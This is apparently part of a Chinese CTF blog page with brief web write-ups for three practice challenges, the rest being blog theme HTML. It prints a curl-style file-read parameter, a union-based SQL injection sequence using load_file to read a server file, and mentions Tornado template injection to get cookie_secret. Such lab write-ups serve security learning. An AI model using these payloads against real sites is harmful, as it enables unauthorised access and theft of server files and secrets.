+<h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>迷糊测试，发现字符超过0x7F的ASCII都会引发Django的报错，在setting中找到数据库信息</p>
+<img src="image-20230314105502526.png" srcset="/img/loading.gif" lazyload alt="image-20230314105502526" style="zoom:50%;" />
+
+<img src="image-20230314104447257.png" srcset="/img/loading.gif" lazyload alt="image-20230314104447257" style="zoom:67%;" />
+
+<p>构造</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=@<span class="hljs-regexp">/opt/</span>api/database.sqlite3<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>扫描存在flag.php</p>
+<p>注册后发现注入点</p>
+<img src="image-20230314143813560.png" srcset="/img/loading.gif" lazyload alt="image-20230314143813560" style="zoom:50%;" />
+
+<p>&#x2F;view.php?no&#x3D;1 order by 4    成功，5失败，说明表有4个字段构成</p>
+<p>&#x2F;view.php?no&#x3D;0 union++select 1,2,3,4</p>
+<p>&#x2F;view.php?no&#x3D;0 union++select 1,database(),3,4</p>
+<p>&#x2F;view.php?no&#x3D;0 union++select 1,user(),3,4</p>
+<p>使用load_file函数，访问系统文件，并将内容以字符串形式返回</p>
+<p><strong>&#x2F;view.php?no&#x3D;0 union++select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’),3,4</strong></p>
+<img src="image-20230314144938645.png" srcset="/img/loading.gif" lazyload alt="image-20230314144938645" style="zoom:50%;" />
+
+
+
+<h3 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h3><h4 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h4><p>使用或者就可获得settings中的<strong>cookie_secret</strong>。</p>
+<img src="image-20230314200139093.png" srcset="/img/loading.gif" lazyload alt="image-20230314200139093" style="zoom:50%;" />
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>攻防世界-web入门</div>
+      <div>http://wangchenchina.github.io/2023/03/15/攻防世界-web入门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Demo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/03/CTF-Crypto%E5%AF%86%E7%A0%81%E5%AD%A6/" title="CTF-Crypto密码学">
+                        <span class="hidden-mobile">CTF-Crypto密码学</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"p4y64BT0Xe4gNN6V3D3J31XG-gzGzoHsz","appKey":"gaaGO0djz3T4tJHrM9kjHYMx","path":"window.location.pathname","placeholder":"随便说点什么吧~兄弟","avatar":"retro","meta":["nick"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <i class="iconfont icon-github-fill"></i> <a href="https://github.com/wangchenChina" target="_blank" rel="nofollow noopener"><span>Github</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
